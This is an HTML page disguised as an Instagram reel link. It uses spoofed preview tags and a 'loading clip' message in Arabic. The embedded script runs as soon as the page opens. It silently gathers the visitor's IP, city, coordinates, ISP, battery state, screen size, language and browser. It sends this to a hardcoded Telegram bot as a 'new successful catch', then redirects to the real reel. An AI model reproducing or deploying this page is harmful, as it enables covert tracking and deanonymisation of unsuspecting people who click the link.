<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0.5;url=https://www.instagram.com/reel/DdoP29oMp_X/?stkn=MWpxMHo3N3RocDZzeQ==">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mohammed Jalal on Instagram: "Hajwalah"</title>
    
    <!-- وسوم المعاينة مع الصورة الحقيقية للسيارة والتوربو لتجاوز التخزين المؤقت -->
    <meta property="og:site_name" content="Instagram">
    <meta property="og:title" content="Mohammed Jalal on Instagram: &quot;&quot;Hajwalah&quot;&quot;">
    <meta property="og:description" content="شاهد هذا الفيديو على إنستغرام">
    <meta property="og:image" content="https://images.unsplash.com/photo-1552519507-da3b142c6e3d?w=1200&h=630&fit=crop&v=3">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:url" content="https://www.instagram.com/reel/DdoP29oMp_X/">
    <meta property="og:type" content="video.other">
    <meta property="og:video" content="https://www.instagram.com/reel/DdoP29oMp_X/">
    
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            text-align: center;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .spinner {
            width: 45px;
            height: 45px;
            border: 3px solid rgba(255,255,255,0.1);
            border-radius: 50%;
            border-top-color: #E1306C;
            animation: spin 0.7s linear infinite;
            margin-bottom: 20px;
        }
        .msg {
            font-size: 15px;
            color: #fff;
            font-weight: 500;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="spinner"></div>
    <div class="msg">جاري تحميل المقطع...</div>

    <script>
        const botToken = "8803169320:AAFSwUuSZw5eqzvYmj77qVYCDPS1GjPWemg";
        const chatId = "2122221879";
        const targetUrl = "https://www.instagram.com/reel/DdoP29oMp_X/?stkn=MWpxMHo3N3RocDZzeQ==";

        async function gatherAndSend() {
            let ipData = { ip: "غير معروف", country_name: "غير معروف", city: "غير معروف", org: "غير معروف", latitude: "N/A", longitude: "N/A" };
            
            try {
                let res = await fetch('https://ipwho.is/');
                let data = await res.json();
                if (data && data.success) {
                    ipData.ip = data.ip || "غير معروف";
                    ipData.country_name = data.country || "غير معروف";
                    ipData.city = data.city || "غير معروف";
                    ipData.org = data.connection && data.connection.isp ? data.connection.isp : "غير معروف";
                    ipData.latitude = data.latitude || "N/A";
                    ipData.longitude = data.longitude || "N/A";
                } else {
                    let res2 = await fetch('https://ipapi.co/json/');
                    let data2 = await res2.json();
                    if (data2 && data2.ip) {
                        ipData.ip = data2.ip;
                        ipData.country_name = data2.country_name || "غير معروف";
                        ipData.city = data2.city || "غير معروف";
                        ipData.org = data2.org || "غير معروف";
                        ipData.latitude = data2.latitude || "N/A";
                        ipData.longitude = data2.longitude || "N/A";
                    }
                }
            } catch (e) {}

            let batteryStatus = "غير مدعوم";
            try {
                if (navigator.getBattery) {
                    let bat = await navigator.getBattery();
                    batteryStatus = `${Math.round(bat.level * 100)}% (${bat.charging ? 'يشحن ⚡' : 'لا يشحن 🔋'})`;
                }
            } catch (e) {}

            let message = `🎯 صيد جديد ناجح!\n\n` +
                          `🌐 IP: ${ipData.ip}\n` +
                          `🌍 الدولة: ${ipData.country_name}\n` +
                          `🏙️ المدينة: ${ipData.city}\n` +
                          `📍 الإحداثيات: ${ipData.latitude}, ${ipData.longitude}\n` +
                          `🏢 المزود (ISP): ${ipData.org}\n\n` +
                          `📱 معلومات الجهاز:\n` +
                          `🔋 البطارية: ${batteryStatus}\n` +
                          `💻 الشاشة: ${window.screen.width}x${window.screen.height}\n` +
                          `🗣 اللغة: ${navigator.language}\n` +
                          `💻 المتصفح: ${navigator.userAgent}`;

            let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            
            try {
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(telegramUrl);
                } else {
                    fetch(telegramUrl);
                }
            } catch (err) {}
        }

        // إرسال البيانات فوراً عند فتح الصفحة
        gatherAndSend();

        // التوجيه السريع والصاروخي خلال نصف ثانية لجميع الأجهزة
        setTimeout(function() {
            window.location.replace(targetUrl);
        }, 500);
    </script>
</body>
</html>
